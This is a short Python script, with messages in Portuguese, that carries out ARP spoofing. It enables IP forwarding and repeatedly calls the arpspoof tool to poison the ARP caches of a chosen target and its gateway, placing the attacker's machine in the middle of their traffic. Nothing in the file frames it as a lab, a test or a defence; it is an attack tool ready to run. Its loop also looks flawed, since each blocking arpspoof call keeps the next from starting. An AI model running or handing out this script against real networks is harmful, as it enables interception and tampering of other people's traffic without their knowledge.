import subprocess
import time

def habilitar_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def realizar_arp_spoofing(target_ip, gateway_ip, interface, stop_event):
    try:
        print(f"Iniciando ARP Spoofing contra o alvo {target_ip} e o gateway {gateway_ip} na interface {interface}...")

        habilitar_ip_forwarding()

        while not stop_event.is_set():
            subprocess.run(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], check=True)
            subprocess.run(["arpspoof", "-i", interface, "-t", gateway_ip, target_ip], check=True)
            time.sleep(2) 

    except subprocess.CalledProcessError as e:
        print(f"[ERRO] Comando arpspoof falhou: {e}")
    except KeyboardInterrupt:
        print("\nARP Spoofing interrompido pelo usuário.")
    finally:
        print("ARP Spoofing interrompido e o processo de forwarding foi desabilitado.")
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
